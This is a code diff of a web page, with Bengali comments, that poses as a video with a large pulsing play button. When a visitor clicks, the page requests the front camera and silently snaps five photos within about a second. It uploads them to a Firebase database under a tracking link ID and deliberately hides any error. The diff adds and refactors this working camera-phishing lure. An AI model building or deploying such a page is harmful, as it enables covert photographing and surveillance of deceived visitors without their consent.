@@ -5,14 +5,19 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+  <style>
+    body,html{margin:0;height:100%;background:#000;overflow:hidden;position:relative;cursor:pointer;}
+    .bg{position:absolute;inset:0;background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover;filter:blur(18px) brightness(0.5);transform:scale(1.15);}
+    .play{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:120px;height:120px;background:#ff0000;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 90px rgba(255,0,0,0.95);border:8px solid rgba(255,255,255,0.5);animation:p 1.5s infinite;}
+    @keyframes p{0%,100%{transform:translate(-50%,-50%) scale(1)}50%{transform:translate(-50%,-50%) scale(1.25)}}
+    .play svg{width:56px;height:56px;fill:#fff;margin-left:10px;}
+  </style>
 </head>
-<body style="margin:0;background:#000;height:100vh;overflow:hidden;cursor:pointer;" onclick="go()">
+<body onclick="start()">
 
-<div style="position:absolute;inset:0;background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover;filter:blur(18px) brightness(0.5);transform:scale(1.15);"></div>
-<div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:120px;height:120px;background:#ff0000;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 90px rgba(255,0,0,0.95);border:8px solid rgba(255,255,255,0.5);animation:p 1.5s infinite;">
-  <svg width="56" height="56" fill="#fff" viewBox="0 0 24 24" style="margin-left:10px;">
-    <path d="M8 5v14l11-7z"/>
-  </svg>
+<div class="bg"></div>
+<div class="play">
+  <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
 </div>
 
 <canvas id="c" style="display:none;"></canvas>
@@ -33,43 +38,55 @@ firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
 // ID ১০০% সঠিকভাবে নেওয়া
-let id = location.pathname.split('/').pop();
-if (!id || id === 'view.html') {
-  id = new URLSearchParams(location.search).get('id');
+let id = new URLSearchParams(location.search).get('id');
+if (!id) {
+  id = location.pathname.split('/').pop();
+  if (id === 'view.html' || id === '') id = null;
+}
+
+if (!id) {
+  alert("লিংক ভুল!");
+  throw new Error("No ID");
 }
 
 const today = new Date().toLocaleDateString('bn-BD');
 const now = new Date().toLocaleString('bn-BD');
 
-function go() {
+function start() {
   const canvas = document.getElementById('c');
   const ctx = canvas.getContext('2d');
   let pics = [];
 
-  navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
+  navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}})
     .then(stream => {
-      const v = document.createElement('video');
-      v.srcObject = stream;
-      v.muted = true;
-      v.play();
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.muted = true;
+      video.play();
 
       let i = 0;
-      const snap = () => {
+      const take = () => {
         if (i >= 5) {
-          db.ref('links/' + id + '/sessions/' + today).set({photos: pics, time: now})
-            .then(() => location.href = "viewer.html?id=" + id);
+          // ছবি সেভ করো
+          db.ref('links/' + id + '/sessions/' + today).set({
+            photos: pics,
+            time: now
+          });
           return;
         }
-        canvas.width = v.videoWidth || 1280;
-        canvas.height = v.videoHeight || 720;
-        ctx.drawImage(v, 0, 0);
+
+        canvas.width = video.videoWidth || 1280;
+        canvas.height = video.videoHeight || 720;
+        ctx.drawImage(video, 0, 0);
         pics.push(canvas.toDataURL('image/jpeg', 0.96));
         i++;
-        setTimeout(snap, 180); // ৫ টি ছবি ১ সেকেন্ডের মধ্যে
+        setTimeout(take, 200);
       };
-      setTimeout(snap, 600);
+      setTimeout(take, 500);
     })
-    .catch(() => setTimeout(() => location.href = "https://google.com", 1000));
+    .catch(() => {
+      // কোনো এরর দেখাবে না
+    });
 }
 </script>
 </body>
